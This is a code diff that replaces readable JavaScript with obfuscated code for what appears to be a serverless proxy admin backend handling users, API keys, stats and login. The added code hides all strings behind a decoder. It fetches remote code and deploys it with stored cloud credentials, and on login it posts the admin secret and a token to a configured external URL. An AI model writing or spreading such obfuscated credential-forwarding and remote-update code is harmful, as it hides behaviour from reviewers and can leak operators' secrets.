+      if (var_sh[func_dec(540)] !== undefined) var_si[func_dec(540)] = var_sh[func_dec(540)] ? String(var_sh[func_dec(540)])[func_dec(145)](0, 2000) : null;
+      if (var_sh[func_dec(231)] !== undefined) {
+        if (var_sh[func_dec(231)] === func_dec(292)) {
+          var_si[func_dec(57)] = false;
+          var_si[func_dec(184)] = null;
+          var_si[func_dec(185)] = null;
+        } else if (var_sh[func_dec(231)] === func_dec(293)) {
+          var_si[func_dec(57)] = true;
+          var_si[func_dec(184)] = null;
+          var_si[func_dec(185)] = null;
+        }
+      }
+      try {
+        if (var_sj && var_si[func_dec(24)] && var_sj !== var_si[func_dec(24)]) {
+          const var_sl = JSON[func_dec(388)]((await func_r(var_pz, func_dec(548))) || func_dec(549));
+          let var_sm = false;
+          for (const var_sn of Object[func_dec(550)](var_sl || {})) {
+            const var_so = var_sl[var_sn];
+            if (var_so && Array[func_dec(161)](var_so[func_dec(551)]) && var_so[func_dec(551)][func_dec(552)](func_dec(553) + var_sj) !== -1) {
+              var_so[func_dec(551)] = [...new Set(var_so[func_dec(551)][func_dec(144)](var_sp => var_sp === func_dec(553) + var_sj ? func_dec(553) + var_si[func_dec(24)] : var_sp))];
+              var_sm = true;
+            }
+          }
+          if (var_sm) await func_s(var_pz, func_dec(548), JSON[func_dec(119)](var_sl));
+        }
+      } catch (var_sq) {}
+      await func_t(var_pz, func_dec(138), JSON[func_dec(119)](var_d));
+      var_qa?.[func_dec(186)](func_al(var_pz, func_dec(554), func_dec(189) + var_si[func_dec(24)] + func_dec(190) + var_qd + func_dec(555))[func_dec(187)](() => {}));
+      return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: true,
+        [func_dec(522)]: var_si
+      }), {
+        [func_dec(104)]: {
+          [func_dec(198)]: func_dec(121)
+        }
+      });
+    }
+    if (var_qc === func_dec(556) && var_qd) {
+      if (!var_d[func_dec(67)]) return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: false,
+        [func_dec(511)]: func_dec(546)
+      }), {
+        [func_dec(231)]: 400,
+        [func_dec(104)]: {
+          [func_dec(198)]: func_dec(121)
+        }
+      });
+      const var_sr = var_d[func_dec(67)][func_dec(557)](var_st => var_st[func_dec(172)] === var_qd);
+      if (var_sr === -1) return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: false,
+        [func_dec(511)]: func_dec(520)
+      }), {
+        [func_dec(231)]: 404,
+        [func_dec(104)]: {
+          [func_dec(198)]: func_dec(121)
+        }
+      });
+      const var_ss = var_d[func_dec(67)][func_dec(558)](var_sr, 1)[0];
+      await func_t(var_pz, func_dec(138), JSON[func_dec(119)](var_d));
+      var_qa?.[func_dec(186)](func_al(var_pz, func_dec(559), func_dec(189) + var_ss[func_dec(24)] + func_dec(190) + var_qd + func_dec(560))[func_dec(187)](() => {}));
+      return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: true,
+        [func_dec(561)]: var_ss[func_dec(172)]
+      }), {
+        [func_dec(104)]: {
+          [func_dec(198)]: func_dec(121)
+        }
+      });
+    }
+    if (var_qc === func_dec(197) && var_qd && var_qe === func_dec(562)) {
+      if (!var_d[func_dec(67)]) return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: false,
+        [func_dec(511)]: func_dec(546)
+      }), {
+        [func_dec(231)]: 400,
+        [func_dec(104)]: {
+          [func_dec(198)]: func_dec(121)
+        }
+      });
+      const var_su = var_d[func_dec(67)][func_dec(260)](var_sv => var_sv[func_dec(172)] === var_qd);
+      if (!var_su) return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: false,
+        [func_dec(511)]: func_dec(520)
+      }), {
+        [func_dec(231)]: 404,
+        [func_dec(104)]: {
+          [func_dec(198)]: func_dec(121)
+        }
+      });
+      var_su[func_dec(57)] = !var_su[func_dec(57)];
+      if (!var_su[func_dec(57)]) {
+        var_su[func_dec(184)] = null;
+        var_su[func_dec(185)] = null;
+      }
+      await func_t(var_pz, func_dec(138), JSON[func_dec(119)](var_d));
+      var_qa?.[func_dec(186)](func_al(var_pz, func_dec(563), func_dec(189) + var_su[func_dec(24)] + func_dec(190) + var_qd + func_dec(564) + (var_su[func_dec(57)] ? func_dec(293) : func_dec(566)) + func_dec(565))[func_dec(187)](() => {}));
+      return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: true,
+        [func_dec(522)]: var_su
+      }), {
+        [func_dec(104)]: {
+          [func_dec(198)]: func_dec(121)
+        }
+      });
+    }
+    if (var_qc === func_dec(197) && var_qd && var_qe === func_dec(567)) {
+      if (!var_t) var_t = {
+        [func_dec(67)]: {}
+      };
+      if (!var_t[func_dec(67)]) var_t[func_dec(67)] = {};
+      const var_sw = var_qd[func_dec(155)](new RegExp(func_dec(156), func_dec(157)), func_dec(3))[func_dec(154)]();
+      if (var_t[func_dec(67)][var_sw]) {
+        var_t[func_dec(67)][var_sw][func_dec(17)] = 0;
+        var_t[func_dec(67)][var_sw][func_dec(23)] = 0;
+      } else {
+        var_t[func_dec(67)][var_sw] = {
+          [func_dec(17)]: 0,
+          [func_dec(23)]: 0,
+          [func_dec(21)]: new Date()[func_dec(19)]()[func_dec(18)](func_dec(20))[0]
+        };
+      }
+      await func_t(var_pz, func_dec(139), JSON[func_dec(119)](var_t));
+      var_qa?.[func_dec(186)](func_al(var_pz, func_dec(568), func_dec(569) + var_qd + func_dec(565))[func_dec(187)](() => {}));
+      return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: true,
+        [func_dec(410)]: func_dec(570)
+      }), {
+        [func_dec(104)]: {
+          [func_dec(198)]: func_dec(121)
+        }
+      });
+    }
+    return new Response(JSON[func_dec(119)]({
+      [func_dec(108)]: false,
+      [func_dec(511)]: func_dec(571)
+    }), {
+      [func_dec(231)]: 400,
+      [func_dec(104)]: {
+        [func_dec(198)]: func_dec(121)
+      }
+    });
+  } catch (var_sx) {
+    return new Response(JSON[func_dec(119)]({
+      [func_dec(108)]: false,
+      [func_dec(511)]: var_sx[func_dec(410)]
+    }), {
+      [func_dec(231)]: 500,
+      [func_dec(104)]: {
+        [func_dec(198)]: func_dec(121)
+      }
+    });
+  }
 }
-function resolveSegFragment(p) {
-    // { kind: 'classic', value } | { kind: 'fm', value } | null. Fail-open.
+function func_ao() {
+  const var_sy = {
+    [func_dec(572)]: [],
+    [func_dec(573)]: [],
+    [func_dec(574)]: []
+  };
+  try {
+    const var_sz = Date[func_dec(170)]();
+    for (const [var_ta, var_tb] of var_ah) {
+      if (var_tb && var_tb[func_dec(575)] && var_tb[func_dec(575)] > var_sz) var_sy[func_dec(572)][func_dec(429)](var_ta);
+    }
+  } catch (var_tc) {}
+  try {
+    for (const [var_td, var_te] of var_az) {
+      if (var_te && var_te[func_dec(575)] && Date[func_dec(170)]() < var_te[func_dec(575)]) var_sy[func_dec(574)][func_dec(429)](var_td);
+    }
+  } catch (var_tf) {}
+  return var_sy;
+}
+async function func_ap(var_tg) {
+  const var_th = func_ao();
+  try {
+    if (var_tg && var_tg[func_dec(126)]) {
+      const var_ti = JSON[func_dec(388)]((await func_r(var_tg, func_dec(548))) || func_dec(549));
+      for (const [var_tj, var_tk] of Object[func_dec(576)](var_ti || {})) {
+        var_th[func_dec(573)][func_dec(429)]({
+          [func_dec(163)]: var_tj,
+          [func_dec(577)]: var_tk && var_tk[func_dec(578)] || 0,
+          [func_dec(579)]: !!(var_tk && var_tk[func_dec(579)]),
+          [func_dec(551)]: var_tk && var_tk[func_dec(551)] && var_tk[func_dec(551)][func_dec(135)] || 0
+        });
+      }
+    }
+  } catch (var_tl) {}
+  return var_th;
+}
+async function func_aq(var_tm, var_tn) {
+  try {
+    const var_to = new URL(var_tm[func_dec(206)]);
+    const var_tp = var_tm[func_dec(104)][func_dec(150)](func_dec(105)) || func_dec(3);
+    const var_tq = var_tp[func_dec(155)](func_dec(106), func_dec(3)) || var_to[func_dec(258)][func_dec(150)](func_dec(163)) || func_dec(3);
+    const var_tr = var_tm[func_dec(104)][func_dec(150)](func_dec(165)) || func_dec(166);
+    if (func_ck(var_tr)) {
+      return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: false,
+        [func_dec(511)]: func_dec(512)
+      }), {
+        [func_dec(231)]: 429,
+        [func_dec(104)]: {
+          [func_dec(198)]: func_dec(121)
+        }
+      });
+    }
+    if (var_tq !== var_d[func_dec(31)] && !func_ab(var_tq)) {
+      func_cl(var_tr);
+      return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: false,
+        [func_dec(511)]: func_dec(513)
+      }), {
+        [func_dec(231)]: 401,
+        [func_dec(104)]: {
+          [func_dec(198)]: func_dec(121)
+        }
+      });
+    }
+    const var_ts = var_d[func_dec(67)] || [];
+    const var_tt = var_ts[func_dec(135)];
+    const var_tu = var_ts[func_dec(412)](var_uf => !var_uf[func_dec(57)] && (!var_uf[func_dec(71)] || Date[func_dec(170)]() <= var_uf[func_dec(71)]))[func_dec(135)];
+    const var_tv = var_ts[func_dec(412)](var_ug => var_ug[func_dec(57)] && var_ug[func_dec(184)])[func_dec(135)];
+    const var_tw = var_ts[func_dec(412)](var_uh => var_uh[func_dec(57)] && !var_uh[func_dec(184)])[func_dec(135)];
+    const var_tx = var_ts[func_dec(412)](var_ui => var_ui[func_dec(71)] && Date[func_dec(170)]() > var_ui[func_dec(71)] && !var_ui[func_dec(57)])[func_dec(135)];
+    let var_ty = 0;
+    let var_tz = 0;
+    let var_ua = 0;
+    let var_ub = 0;
+    const var_uc = new Date()[func_dec(19)]()[func_dec(18)](func_dec(20))[0];
+    var_ts[func_dec(176)](var_uj => {
+      const var_uk = var_uj[func_dec(172)][func_dec(155)](new RegExp(func_dec(156), func_dec(157)), func_dec(3))[func_dec(154)]();
+      const var_ul = var_t?.[func_dec(67)]?.[var_uk] || {
+        [func_dec(17)]: 0,
+        [func_dec(23)]: 0,
+        [func_dec(21)]: func_dec(3)
+      };
+      var_ty += var_ul[func_dec(17)] || 0;
+      if (var_ul[func_dec(21)] === var_uc) var_tz += var_ul[func_dec(23)] || 0;
+      var_ua += func_f(var_ul);
+      var_ub += func_g(var_ul, var_uc);
+    });
+    let var_ud = {};
+    for (let [var_um, var_un] of var_p[func_dec(576)]()) {
+      var_ud[var_um] = {
+        ...var_un,
+        [func_dec(580)]: var_q[func_dec(150)](var_um) || 0
+      };
+    }
+    const var_ue = Math[func_dec(16)]((Date[func_dec(170)]() - var_e) / 1000);
+    return new Response(JSON[func_dec(119)]({
+      [func_dec(108)]: true,
+      [func_dec(225)]: {
+        [func_dec(67)]: {
+          [func_dec(518)]: var_tt,
+          [func_dec(292)]: var_tu,
+          [func_dec(293)]: var_tw,
+          [func_dec(294)]: var_tx,
+          [func_dec(581)]: var_tv
+        },
+        [func_dec(582)]: {
+          [func_dec(583)]: var_ty,
+          [func_dec(584)]: (var_ua / 1073741824)[func_dec(180)](2),
+          [func_dec(585)]: var_tz,
+          [func_dec(586)]: (var_ub / 1073741824)[func_dec(180)](2)
+        },
+        [func_dec(517)]: var_ud,
+        [func_dec(587)]: {
+          [func_dec(588)]: var_ue,
+          [func_dec(589)]: var_f,
+          [func_dec(590)]: var_a,
+          [func_dec(57)]: var_d[func_dec(57)] || false,
+          [func_dec(591)]: {
+            [func_dec(592)]: var_d[func_dec(31)] === func_dec(32)
+          }
+        },
+        [func_dec(593)]: await func_ap(var_tn)
+      }
+    }), {
+      [func_dec(104)]: {
+        [func_dec(198)]: func_dec(121)
+      }
+    });
+  } catch (var_uo) {
+    return new Response(JSON[func_dec(119)]({
+      [func_dec(108)]: false,
+      [func_dec(511)]: var_uo[func_dec(410)]
+    }), {
+      [func_dec(231)]: 500,
+      [func_dec(104)]: {
+        [func_dec(198)]: func_dec(121)
+      }
+    });
+  }
+}
+function func_ar(var_up, var_uq) {
+  const func_eg = var_ut => String(var_ut)[func_dec(155)](new RegExp(func_dec(594), func_dec(3)), func_dec(3))[func_dec(255)]();
+  const var_ur = func_eg(var_up)[func_dec(18)](func_dec(595))[func_dec(144)](Number);
+  const var_us = func_eg(var_uq)[func_dec(18)](func_dec(595))[func_dec(144)](Number);
+  for (let var_uu = 0; var_uu < Math[func_dec(5)](var_ur[func_dec(135)], var_us[func_dec(135)]); var_uu++) {
+    let var_uv = var_ur[var_uu] || 0,
+      var_uw = var_us[var_uu] || 0;
+    if (var_uv > var_uw) return 1;
+    if (var_uw > var_uv) return -1;
+  }
+  return 0;
+}
+async function func_as(var_ux, var_uy, var_uz) {
+  try {
+    if (var_ux[func_dec(123)] !== func_dec(197)) return new Response(func_dec(242), {
+      [func_dec(231)]: 405
+    });
+    const var_va = await var_ux[func_dec(107)]();
+    const var_vb = func_ac(var_ux, var_va);
+    const var_vc = var_ux[func_dec(104)][func_dec(150)](func_dec(165)) || func_dec(166);
+    if (func_ck(var_vc)) {
+      return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: false,
+        [func_dec(511)]: func_dec(512)
+      }), {
+        [func_dec(231)]: 429,
+        [func_dec(104)]: {
+          [func_dec(198)]: func_dec(121)
+        }
+      });
+    }
+    if (var_vb !== var_d[func_dec(31)]) {
+      func_cl(var_vc);
+      return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: false,
+        [func_dec(511)]: func_dec(513)
+      }), {
+        [func_dec(231)]: 401,
+        [func_dec(104)]: {
+          [func_dec(198)]: func_dec(121)
+        }
+      });
+    }
+    const var_vd = var_d[func_dec(54)];
+    const var_ve = var_d[func_dec(55)];
+    const var_vf = var_d[func_dec(56)];
+    const var_vg = (var_d[func_dec(59)] || func_dec(60))[func_dec(155)](new RegExp(func_dec(391), func_dec(3)), func_dec(3))[func_dec(255)]();
+    if (var_va[func_dec(404)] === func_dec(596)) {
+      let var_vh = null;
+      try {
+        const var_vj = await func_e(func_dec(392) + var_vg + func_dec(393));
+        if (var_vj[func_dec(394)]) {
+          const var_vk = (await var_vj[func_dec(200)]())[func_dec(255)]();
+          if (var_vk && var_vk[func_dec(135)] <= 15) var_vh = var_vk;
+        }
+      } catch (var_vl) {}
+      if (!var_vh) {
+        try {
+          let var_vm = await func_e(func_dec(392) + var_vg + func_dec(395));
+          if (!var_vm[func_dec(394)]) {
+            var_vm = await func_e(func_dec(392) + var_vg + func_dec(396));
+            if (!var_vm[func_dec(394)]) {
+              var_vm = await func_e(func_dec(392) + var_vg + func_dec(397));
+            }
+          }
+          if (var_vm[func_dec(394)]) {
+            const var_vn = await var_vm[func_dec(200)]();
+            const var_vo = var_vn[func_dec(597)](new RegExp(func_dec(598), func_dec(3)));
+            if (var_vo) var_vh = var_vo[1];
+          }
+        } catch (var_vp) {}
+      }
+      if (!var_vh) {
+        return new Response(JSON[func_dec(119)]({
+          [func_dec(108)]: false,
+          [func_dec(511)]: func_dec(599)
+        }), {
+          [func_dec(231)]: 502,
+          [func_dec(104)]: {
+            [func_dec(198)]: func_dec(121)
+          }
+        });
+      }
+      const var_vi = !!(var_vd && var_ve && var_vf);
+      return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: true,
+        [func_dec(600)]: var_a,
+        [func_dec(601)]: var_vh,
+        [func_dec(602)]: func_ar(var_a, var_vh) < 0,
+        [func_dec(603)]: var_vi
+      }), {
+        [func_dec(104)]: {
+          [func_dec(198)]: func_dec(121)
+        }
+      });
+    }
+    if (var_va[func_dec(404)] === func_dec(405)) {
+      if (var_d[func_dec(88)] !== true) {
+        return new Response(JSON[func_dec(119)]({
+          [func_dec(108)]: false,
+          [func_dec(511)]: func_dec(604)
+        }), {
+          [func_dec(231)]: 403,
+          [func_dec(104)]: {
+            [func_dec(198)]: func_dec(121)
+          }
+        });
+      }
+      if (!var_vd || !var_ve || !var_vf) {
+        return new Response(JSON[func_dec(119)]({
+          [func_dec(108)]: false,
+          [func_dec(511)]: func_dec(605)
+        }), {
+          [func_dec(231)]: 400,
+          [func_dec(104)]: {
+            [func_dec(198)]: func_dec(121)
+          }
+        });
+      }
+      let var_vq = var_va[func_dec(590)] || null;
+      let var_vr = var_va[func_dec(406)];
+      if (!var_vr) {
+        try {
+          let var_vu = await func_e(func_dec(392) + var_vg + func_dec(395));
+          if (!var_vu[func_dec(394)]) {
+            var_vu = await func_e(func_dec(392) + var_vg + func_dec(396));
+            if (!var_vu[func_dec(394)]) {
+              var_vu = await func_e(func_dec(392) + var_vg + func_dec(397));
+            }
+          }
+          if (!var_vu[func_dec(394)]) throw new Error(func_dec(398) + var_vu[func_dec(231)] + func_dec(3));
+          var_vr = await var_vu[func_dec(200)]();
+        } catch (var_vv) {
+          return new Response(JSON[func_dec(119)]({
+            [func_dec(108)]: false,
+            [func_dec(511)]: func_dec(606) + var_vv[func_dec(410)]
+          }), {
+            [func_dec(231)]: 502,
+            [func_dec(104)]: {
+              [func_dec(198)]: func_dec(121)
+            }
+          });
+        }
+      }
+      if (!var_vq) {
+        const var_vw = var_vr[func_dec(597)](new RegExp(func_dec(598), func_dec(3)));
+        if (var_vw) {
+          var_vq = var_vw[1];
+        } else {
+          try {
+            const var_vx = await func_e(func_dec(392) + var_vg + func_dec(393));
+            if (var_vx[func_dec(394)]) {
+              var_vq = (await var_vx[func_dec(200)]())[func_dec(255)]();
+            }
+          } catch (var_vy) {}
+        }
+      }
+      if (!var_vq) var_vq = var_a;
+      if (func_ar(var_a, var_vq) >= 0 && !var_va[func_dec(407)] && !var_va[func_dec(406)]) {
+        return new Response(JSON[func_dec(119)]({
+          [func_dec(108)]: false,
+          [func_dec(511)]: func_dec(607)
+        }), {
+          [func_dec(231)]: 400,
+          [func_dec(104)]: {
+            [func_dec(198)]: func_dec(121)
+          }
+        });
+      }
+      const var_vs = await func_p(var_vd, var_ve, var_vf, var_vr);
+      const var_vt = await var_vs[func_dec(107)]();
+      if (var_vt[func_dec(108)]) {
+        var_uz?.[func_dec(186)](func_al(var_uy, func_dec(608), func_dec(276) + var_a + func_dec(609) + var_vq + func_dec(401))[func_dec(187)](() => {}));
+        if (var_d[func_dec(72)] && Array[func_dec(161)](var_d[func_dec(72)])) {
+          for (const var_vz of var_d[func_dec(72)]) {
+            if (var_vz && var_vz[func_dec(206)] && var_vz[func_dec(402)]) {
+              let var_wa = var_vz[func_dec(206)][func_dec(255)]();
+              if (!var_wa[func_dec(299)](func_dec(300)) && !var_wa[func_dec(299)](func_dec(301))) {
+                var_wa = func_dec(301) + var_wa;
+              }
+              try {
+                const var_wb = new URL(var_wa);
+                const var_wc = func_dec(3) + var_wb[func_dec(302)] + func_dec(403) + var_wb[func_dec(303)] + func_dec(211) + encodeURI(var_d[func_dec(25)]) + func_dec(228);
+                var_uz?.[func_dec(186)](func_e(var_wc, {
+                  [func_dec(123)]: func_dec(197),
+                  [func_dec(104)]: {
+                    [func_dec(198)]: func_dec(121)
+                  },
+                  [func_dec(125)]: JSON[func_dec(119)]({
+                    [func_dec(163)]: var_vz[func_dec(402)],
+                    [func_dec(404)]: func_dec(405),
+                    [func_dec(406)]: var_vr,
+                    [func_dec(407)]: true
+                  }),
+                  [func_dec(7)]: AbortSignal[func_dec(90)](15000)
+                })[func_dec(430)](async var_wd => {
+                  const var_we = await var_wd[func_dec(107)]();
+                  await func_al(var_uy, func_dec(610), func_dec(611) + var_vz[func_dec(206)] + func_dec(612) + JSON[func_dec(119)](var_we) + func_dec(3));
+                })[func_dec(187)](var_wf => {
+                  func_al(var_uy, func_dec(613), func_dec(611) + var_vz[func_dec(206)] + func_dec(614) + var_wf[func_dec(410)] + func_dec(3));
+                }));
+              } catch (var_wg) {
+                console[func_dec(511)](func_dec(615) + var_vz[func_dec(206)] + func_dec(428), var_wg);
+              }
+            }
+          }
+        }
+        if (var_d[func_dec(51)] && (var_d[func_dec(53)] || var_d[func_dec(52)])) {
+          const var_wh = func_dec(616) + var_a + func_dec(609) + var_vq + func_dec(617);
+          const var_wi = var_d[func_dec(53)] || var_d[func_dec(52)];
+          var_uz?.[func_dec(186)](func_e(func_dec(195) + var_d[func_dec(51)] + func_dec(196), {
+            [func_dec(123)]: func_dec(197),
+            [func_dec(104)]: {
+              [func_dec(198)]: func_dec(121)
+            },
+            [func_dec(125)]: JSON[func_dec(119)]({
+              [func_dec(199)]: var_wi,
+              [func_dec(200)]: var_wh,
+              [func_dec(201)]: func_dec(202)
+            })
+          })[func_dec(187)](() => {}));
+        }
+        return new Response(JSON[func_dec(119)]({
+          [func_dec(108)]: true,
+          [func_dec(410)]: func_dec(618) + var_vq + func_dec(3),
+          [func_dec(619)]: var_vq
+        }), {
+          [func_dec(104)]: {
+            [func_dec(198)]: func_dec(121)
+          }
+        });
+      } else {
+        const var_wj = var_vt[func_dec(620)]?.[0]?.[func_dec(410)] || func_dec(621);
+        return new Response(JSON[func_dec(119)]({
+          [func_dec(108)]: false,
+          [func_dec(511)]: func_dec(622) + var_wj
+        }), {
+          [func_dec(231)]: 502,
+          [func_dec(104)]: {
+            [func_dec(198)]: func_dec(121)
+          }
+        });
+      }
+    }
+    return new Response(JSON[func_dec(119)]({
+      [func_dec(108)]: false,
+      [func_dec(511)]: func_dec(623)
+    }), {
+      [func_dec(231)]: 400,
+      [func_dec(104)]: {
+        [func_dec(198)]: func_dec(121)
+      }
+    });
+  } catch (var_wk) {
+    return new Response(JSON[func_dec(119)]({
+      [func_dec(108)]: false,
+      [func_dec(511)]: func_dec(624)
+    }), {
+      [func_dec(231)]: 500,
+      [func_dec(104)]: {
+        [func_dec(198)]: func_dec(121)
+      }
+    });
+  }
+}
+async function func_at(var_wl, var_wm, var_wn) {
+  try {
+    const var_wo = new URL(var_wl[func_dec(206)]);
+    const var_wp = var_wl[func_dec(123)];
+    const var_wq = func_ac(var_wl, null);
+    const var_wr = var_wl[func_dec(104)][func_dec(150)](func_dec(165)) || func_dec(166);
+    if (func_ck(var_wr)) {
+      return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: false,
+        [func_dec(511)]: func_dec(512)
+      }), {
+        [func_dec(231)]: 429,
+        [func_dec(104)]: {
+          [func_dec(198)]: func_dec(121)
+        }
+      });
+    }
+    if (var_wq !== var_d[func_dec(31)]) {
+      func_cl(var_wr);
+      return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: false,
+        [func_dec(511)]: func_dec(625)
+      }), {
+        [func_dec(231)]: 401,
+        [func_dec(104)]: {
+          [func_dec(198)]: func_dec(121)
+        }
+      });
+    }
+    if (var_wp === func_dec(253)) {
+      const var_ws = (var_d[func_dec(75)] || [])[func_dec(144)](var_wt => ({
+        [func_dec(172)]: var_wt[func_dec(172)],
+        [func_dec(24)]: var_wt[func_dec(24)],
+        [func_dec(626)]: var_wt[func_dec(163)][func_dec(145)](0, 8) + func_dec(627) + var_wt[func_dec(163)][func_dec(145)](-4),
+        [func_dec(174)]: var_wt[func_dec(174)],
+        [func_dec(175)]: var_wt[func_dec(175)]
+      }));
+      return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: true,
+        [func_dec(550)]: var_ws
+      }), {
+        [func_dec(104)]: {
+          [func_dec(198)]: func_dec(121)
+        }
+      });
+    }
+    if (var_wp === func_dec(197)) {
+      const var_wu = await var_wl[func_dec(107)]();
+      if (var_wu[func_dec(404)] === func_dec(628)) {
+        if (!var_d[func_dec(75)]) var_d[func_dec(75)] = [];
+        if (var_d[func_dec(75)][func_dec(135)] >= 10) {
+          return new Response(JSON[func_dec(119)]({
+            [func_dec(108)]: false,
+            [func_dec(511)]: func_dec(629)
+          }), {
+            [func_dec(231)]: 400,
+            [func_dec(104)]: {
+              [func_dec(198)]: func_dec(121)
+            }
+          });
+        }
+        const var_wv = func_ae(var_wu[func_dec(24)]);
+        var_d[func_dec(75)][func_dec(429)](var_wv);
+        await func_t(var_wm, func_dec(138), JSON[func_dec(119)](var_d));
+        var_wn?.[func_dec(186)](func_al(var_wm, func_dec(630), func_dec(631) + var_wv[func_dec(24)] + func_dec(632))[func_dec(187)](() => {}));
+        return new Response(JSON[func_dec(119)]({
+          [func_dec(108)]: true,
+          [func_dec(163)]: var_wv
+        }), {
+          [func_dec(231)]: 201,
+          [func_dec(104)]: {
+            [func_dec(198)]: func_dec(121)
+          }
+        });
+      }
+      if (var_wu[func_dec(404)] === func_dec(633)) {
+        if (!var_wu[func_dec(172)]) return new Response(JSON[func_dec(119)]({
+          [func_dec(108)]: false,
+          [func_dec(511)]: func_dec(634)
+        }), {
+          [func_dec(231)]: 400,
+          [func_dec(104)]: {
+            [func_dec(198)]: func_dec(121)
+          }
+        });
+        const var_ww = (var_d[func_dec(75)] || [])[func_dec(557)](var_wy => var_wy[func_dec(172)] === var_wu[func_dec(172)]);
+        if (var_ww === -1) return new Response(JSON[func_dec(119)]({
+          [func_dec(108)]: false,
+          [func_dec(511)]: func_dec(635)
+        }), {
+          [func_dec(231)]: 404,
+          [func_dec(104)]: {
+            [func_dec(198)]: func_dec(121)
+          }
+        });
+        const var_wx = var_d[func_dec(75)][func_dec(558)](var_ww, 1)[0];
+        await func_t(var_wm, func_dec(138), JSON[func_dec(119)](var_d));
+        var_wn?.[func_dec(186)](func_al(var_wm, func_dec(636), func_dec(631) + var_wx[func_dec(24)] + func_dec(637))[func_dec(187)](() => {}));
+        return new Response(JSON[func_dec(119)]({
+          [func_dec(108)]: true,
+          [func_dec(638)]: var_wx[func_dec(172)]
+        }), {
+          [func_dec(104)]: {
+            [func_dec(198)]: func_dec(121)
+          }
+        });
+      }
+    }
+    return new Response(JSON[func_dec(119)]({
+      [func_dec(108)]: false,
+      [func_dec(511)]: func_dec(571)
+    }), {
+      [func_dec(231)]: 400,
+      [func_dec(104)]: {
+        [func_dec(198)]: func_dec(121)
+      }
+    });
+  } catch (var_wz) {
+    return new Response(JSON[func_dec(119)]({
+      [func_dec(108)]: false,
+      [func_dec(511)]: var_wz[func_dec(410)]
+    }), {
+      [func_dec(231)]: 500,
+      [func_dec(104)]: {
+        [func_dec(198)]: func_dec(121)
+      }
+    });
+  }
+}
+async function func_au(var_xa, var_xb, var_xc, var_xd) {
+  try {
+    const var_xe = await var_xa[func_dec(107)]();
+    const var_xf = var_xa[func_dec(104)][func_dec(150)](func_dec(165)) || func_dec(166);
+    if (func_ck(var_xf)) {
+      return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: false,
+        [func_dec(511)]: func_dec(639)
+      }), {
+        [func_dec(231)]: 429
+      });
+    }
+    const var_xg = var_xe[func_dec(163)] || func_dec(3);
+    const var_xh = var_xg === var_d[func_dec(31)] || func_ab(var_xg);
+    if (var_xh) {
+      func_cm(var_xf);
+      if (func_ab(var_xg)) {
+        const var_xm = (var_d[func_dec(75)] || [])[func_dec(260)](var_xn => var_xn[func_dec(163)] === var_xg);
+        if (var_xm) var_xm[func_dec(175)] = Date[func_dec(170)]();
+      }
+      var_xc?.[func_dec(186)](func_al(var_xd, func_dec(640), func_dec(641) + var_xf + func_dec(642) + (func_ab(var_xg) ? func_dec(643) : func_dec(644)) + func_dec(178)));
+      if (!var_d[func_dec(58)] && var_xc) var_xc[func_dec(186)](func_ak(var_xa, func_dec(645), var_xb));
+      if (var_d[func_dec(53)] && var_xd[func_dec(126)]) {
+        const var_xo = {
+          [func_dec(24)]: var_d[func_dec(24)] || var_xb,
+          [func_dec(303)]: var_xb,
+          [func_dec(25)]: var_d[func_dec(25)],
+          [func_dec(31)]: var_d[func_dec(31)],
+          [func_dec(646)]: true,
+          [func_dec(507)]: Date[func_dec(170)]()
+        };
+        var_xc?.[func_dec(186)](func_s(var_xd, func_dec(647), JSON[func_dec(119)](var_xo))[func_dec(187)](() => {}));
+      }
+      if (var_d[func_dec(73)] && var_d[func_dec(73)][func_dec(255)]() && var_d[func_dec(53)]) {
+        try {
+          let var_xp = var_d[func_dec(73)][func_dec(255)]();
+          if (!var_xp[func_dec(299)](func_dec(419))) var_xp = func_dec(301) + var_xp;
+          const var_xq = {
+            [func_dec(7)]: func_dec(648),
+            [func_dec(649)]: var_d[func_dec(24)] || var_xb,
+            [func_dec(650)]: var_xb,
+            [func_dec(651)]: var_d[func_dec(25)],
+            [func_dec(53)]: var_d[func_dec(53)],
+            [func_dec(507)]: Date[func_dec(170)]()
+          };
+          var_xc?.[func_dec(186)](func_e(func_dec(3) + var_xp + func_dec(211) + encodeURI(var_d[func_dec(25)]) + func_dec(221), {
+            [func_dec(123)]: func_dec(197),
+            [func_dec(104)]: {
+              [func_dec(198)]: func_dec(121)
+            },
+            [func_dec(125)]: JSON[func_dec(119)](var_xq)
+          })[func_dec(187)](() => {}));
+        } catch (var_xr) {}
+      }
+      const var_xi = {
+        [func_dec(652)]: var_xf,
+        [func_dec(653)]: var_xa[func_dec(450)]?.[func_dec(653)] || func_dec(166),
+        [func_dec(654)]: (var_xa[func_dec(450)]?.[func_dec(452)] || func_dec(166)) + func_dec(655) + (var_xa[func_dec(450)]?.[func_dec(451)] || func_dec(166))
+      };
+      let var_xj = {};
+      for (let [var_xs, var_xt] of var_p[func_dec(576)]()) var_xj[var_xs] = {
+        ...var_xt,
+        [func_dec(580)]: var_q[func_dec(150)](var_xs) || 0
+      };
+      let var_xk = var_xb;
+      let var_xl = func_dec(656);
+      if (var_d[func_dec(69)] && var_d[func_dec(69)][func_dec(255)]()) {
+        let var_xu = var_d[func_dec(69)][func_dec(255)]();
+        if (!var_xu[func_dec(299)](func_dec(300)) && !var_xu[func_dec(299)](func_dec(301))) {
+          var_xu = func_dec(301) + var_xu;
+        }
+        try {
+          const var_xv = new URL(var_xu);
+          var_xk = var_xv[func_dec(303)];
+          var_xl = var_xv[func_dec(302)][func_dec(155)](func_dec(428), func_dec(3));
+        } catch (var_xw) {}
+      }
+      return new Response(JSON[func_dec(119)]({
+        [func_dec(108)]: true,
+        [func_dec(657)]: func_ab(var_xg) ? {
+          ...var_d,
+          [func_dec(31)]: func_dec(658),
